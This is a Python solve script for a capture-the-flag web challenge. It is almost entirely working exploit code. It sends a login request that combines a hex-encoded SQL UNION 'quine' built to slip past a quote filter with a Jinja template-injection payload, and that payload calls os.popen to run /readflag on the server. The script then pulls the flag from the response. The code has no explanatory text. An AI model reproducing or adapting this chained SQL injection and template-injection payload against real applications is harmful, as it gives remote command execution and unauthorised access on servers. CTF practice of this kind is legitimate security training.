import requests
import binascii
import re

URL = "https://no-quotes-2-1dd0f3fe1ed1cc1f.chals.uoftctf.org"

URL = URL.rstrip('/')

def to_hex(s):
    return binascii.hexlify(s.encode()).decode().upper()

def solve():
    target_url = f"{URL}/login?a=os&b=/readflag"
    print(f"[*] Target: {target_url}")

    ssti_payload = (
        "{{ request.application.__globals__.__builtins__"
        ".__import__(request.args.a).popen(request.args.b).read() }}"
    )

    username_val = ssti_payload + "\\"
    username_hex = to_hex(username_val)

    template = f") UNION SELECT 0x{username_hex}, REPLACE(0x?, 0x3F, HEX(0x?)) #"
    
    template_hex = to_hex(template)
    
    password_val = template.replace("?", template_hex)
    
    data = {
        "username": username_val,
        "password": password_val
    }

    print(f"[*] Sending corrected Quine payload...")

    try:
        s = requests.Session()
        r = s.post(target_url, data=data)
        
        content = r.text
        
        if r.status_code == 200 and "Redirecting" in r.text:
            print("[*] Login successful! Redirecting to home...")
            r_home = s.get(f"{URL}/home?a=os&b=/readflag") 
            content = r_home.text
        elif r.history:
             print("[*] Redirect followed automatically.")
        
        if "Under construction" not in content and "Redirecting" not in content:
             r_home = s.get(f"{URL}/home?a=os&b=/readflag")
             if "Under construction" in r_home.text:
                 content += r_home.text

        flag = re.search(r"uoftctf\{.*?\}", content)
        
        if flag:
            print(f"\n[+] FLAG FOUND: {flag.group(0)}\n")
        else:
            if "Invalid credentials" in content:
                print("[-] Error: Still Invalid Credentials. Quine mismatch.")
            elif "No quotes allowed" in content:
                print("[-] Error: WAF blocked the request.")
            else:
                print("[-] Flag not found in response.")
                if "Welcome," in content:
                    print("Debug: Logged in, but SSTI output is missing or empty.")
    
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    solve()